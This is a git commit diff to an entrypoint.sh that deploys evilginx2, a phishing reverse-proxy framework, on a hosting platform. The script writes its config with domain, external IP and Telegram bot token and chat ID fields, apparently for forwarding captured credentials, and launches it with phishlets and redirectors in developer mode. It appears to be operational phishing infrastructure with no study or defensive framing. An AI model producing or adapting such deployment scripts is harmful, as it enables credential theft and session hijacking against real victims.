ebe0de8f98b4dde43e03360546bb9844b68495e9
svrpsdev <jack.harlow1@yahoo.com>
2026-08-01 14:32:07 +0000

    Update entrypoint.sh

--- entrypoint.sh
+++ entrypoint.sh
@@ -1,18 +1,15 @@
 #!/bin/sh
 set -e
-
 mkdir -p /root/.evilginx
-
-# Write full config.json with port from Railway env
 cat > /root/.evilginx/config.json <<EOF
 {
   "server_ip": "0.0.0.0",
   "http_port": 80,
   "https_port": ${PORT:-443},
+  "domain": "${DOMAIN}",
+  "ipv4_external": "${EXTERNAL_IP}",
   "chatid": "${CHAT_ID}",
   "teletoken": "${TELE_TOKEN}"
 }
 EOF
-
-# If developer mode is desired, you can pass -developer flag here
-exec /usr/local/bin/evilginx2 -p ./phishlets -t ./redirectors "$@"
+exec /usr/local/bin/evilginx2 -developer -p ./phishlets -t ./redirectors
